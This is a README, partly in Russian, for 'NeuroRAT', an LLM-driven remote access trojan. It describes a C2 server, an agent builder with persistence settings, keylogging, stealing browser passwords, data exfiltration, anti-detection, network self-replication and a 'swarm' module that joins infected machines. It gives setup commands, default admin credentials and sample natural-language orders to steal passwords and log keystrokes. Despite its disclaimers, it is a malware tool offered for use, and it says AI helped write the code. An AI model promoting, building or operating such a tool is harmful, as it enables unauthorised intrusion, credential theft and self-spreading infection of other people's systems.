# NeuroRAT

![NeuroRAT Logo](docs/images/logo.svg)

<div align="center">

```
██╗    ██╗ █████╗ ██████╗ ███╗   ██╗██╗███╗   ██╗ ██████╗ 
██║    ██║██╔══██╗██╔══██╗████╗  ██║██║████╗  ██║██╔════╝ 
██║ █╗ ██║███████║██████╔╝██╔██╗ ██║██║██╔██╗ ██║██║  ███╗
██║███╗██║██╔══██║██╔══██╗██║╚██╗██║██║██║╚██╗██║██║   ██║
╚███╔███╔╝██║  ██║██║  ██║██║ ╚████║██║██║ ╚████║╚██████╔╝
 ╚══╝╚══╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝╚═╝  ╚═══╝ ╚═════╝ 
```

</div>

```console
[!] SECURITY NOTICE [!]
--------------------
This project is strictly RESEARCH-ORIENTED. Created and published 
exclusively for scientific and educational purposes in private repositories.

ANY USE OF THIS CODE FOR ILLEGAL PURPOSES IS A CRIMINAL OFFENSE.
```

> **CRITICAL WARNING**: The `swarm_intelligence.py` module contains potentially dangerous code that theoretically enables the unification of all infected systems into a single decentralized network. It is **STRICTLY PROHIBITED** to activate this module outside a tightly controlled research environment. This module is intended exclusively for demonstrating theoretical capabilities of decentralized attacks and developing appropriate defense mechanisms.

## Overview

NeuroRAT is an advanced remote access tool designed for penetration testing and security research. It combines traditional RAT capabilities with artificial intelligence through LLM (Large Language Model) integration, enabling autonomous decision-making and natural language command interpretation.

⚠️ **DISCLAIMER: This tool is for EDUCATIONAL PURPOSES ONLY. The author is not responsible for any misuse or damage caused by this program. Only use on systems you have permission to access.**

⚠️ **IMPORTANT NOTICE: This entire codebase was accidentally generated and implemented with the assistance of AI. We have realized that we may have unintentionally created code that could violate laws regarding computer security and unauthorized access tools. We deeply regret this oversight and do not condone the use of this code for any malicious purposes. This repository exists purely for academic understanding of security vulnerabilities.**

## Key Features

- 🤖 **AI-Powered Command Interpretation**: Use natural language to control the agent
- 🔄 **Cross-Platform Compatibility**: Windows, macOS, and Linux support
- 🧩 **Modular Design**: Easily extendable with new capabilities
- 🔒 **Secure Communications**: End-to-end encrypted connections
- 🕵️ **Stealth Operations**: Minimal footprint with anti-detection features
- 🛠️ **Comprehensive Toolkit**: Keylogging, screen capture, data exfiltration, and more
- 🌐 **Децентрализованный ИИ**: Поддержка полностью автономной работы с локальными моделями
- 🧠 **Самообучение**: Адаптация к окружению и оптимизация тактик
- 🔄 **Роевой интеллект**: Распределенное принятие решений (экспериментальный модуль)

## Architecture

![NeuroRAT Architecture](docs/images/architecture_diagram.svg)

NeuroRAT consists of four primary components:

1. **Command & Control (C2) Server**: Central management system
2. **Agent Module**: Client-side execution environment
3. **LLM Processor**: AI-powered natural language understanding
4. **Agent Builder**: Deployment and packaging utility

For detailed architectural information, see [Architecture Documentation](architecture.md).

## Documentation

- [Technical Documentation](technical_docs.md): Detailed developer guide
- [Installation Guide](#installation): Quick setup instructions
- [Usage Guide](#usage): Basic usage instructions
- [Простым языком](простым%20языком.txt): Simple explanation in casual language

## Installation

### Prerequisites

- Python 3.8+
- Git
- pip (менеджер пакетов Python)

### Установка из GitHub
```bash
# Клонируем репозиторий
git clone https://github.com/Personaz1/AgentX.git
cd AgentX

# Устанавливаем зависимости
pip3 install fastapi uvicorn jinja2 python-multipart pillow psutil

# Запускаем сервер
python3 server_api.py
```

После запуска сервер будет доступен по адресу http://localhost:8080
- Логин: `admin`
- Пароль: `neurorat`

### Доступные модули

- **C2 Сервер**: Центральный сервер управления и контроля
- **Билдер агентов**: Создает кастомизированные агенты для различных ОС
- **Модуль саморепликации**: Автоматически сканирует сеть и распространяет агенты
- **Веб-интерфейс**: Управление агентами через современный веб-интерфейс

### Возможности агента

- Сбор системной информации
- Выполнение команд
- Захват скриншотов
- Поиск уязвимостей
- Мониторинг процессов
- Поиск файлов и учетных данных

## Билдер и саморепликация

Доступ к билдеру: http://localhost:8080/builder

Билдер позволяет:
1. Создавать настроенных агентов для Windows, Linux и macOS
2. Настраивать параметры персистентности
3. Указывать адрес и порт C2 сервера

Модуль саморепликации:
1. Сканирует локальную сеть
2. Обнаруживает открытые порты и сервисы
3. Автоматически распространяет агенты на найденные системы

## Использование Docker для разработки

Для использования в контейнере (только для тестирования и разработки):
```bash
docker build -t neurorat .
docker run -p 8080:8080 -p 5050:5000 neurorat
```

## Структура проекта

- `server_api.py` - Основной C2 сервер
- `templates/` - HTML шаблоны веб-интерфейса
- `minimal_*.py` - Минимальные агенты для разных ОС

## Usage

1. Access the web interface at `http://localhost:8080`
2. View connected agents and their details
3. Issue commands using natural language or direct execution
4. Monitor agent activity and collect exfiltrated data

### Example Commands

Using natural language with the LLM processor:

- "Take a screenshot every 5 minutes"
- "Find all passwords stored in web browsers"
- "Monitor keystrokes and send an update every hour"
- "Gather system information and send it back"

## Contributing

Contributions are welcome! Please feel free to submit a Pull Request.

1. Fork the repository
2. Create your feature branch: `git checkout -b feature/amazing-feature`
3. Commit your changes: `git commit -am 'Add some amazing feature'`
4. Push to the branch: `git push origin feature/amazing-feature`
5. Open a Pull Request

## License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.

## Author

Mr. Thomas Anderson (iamtomasanderson@gmail.com)

GitHub: [Personaz1](https://github.com/Personaz1/) 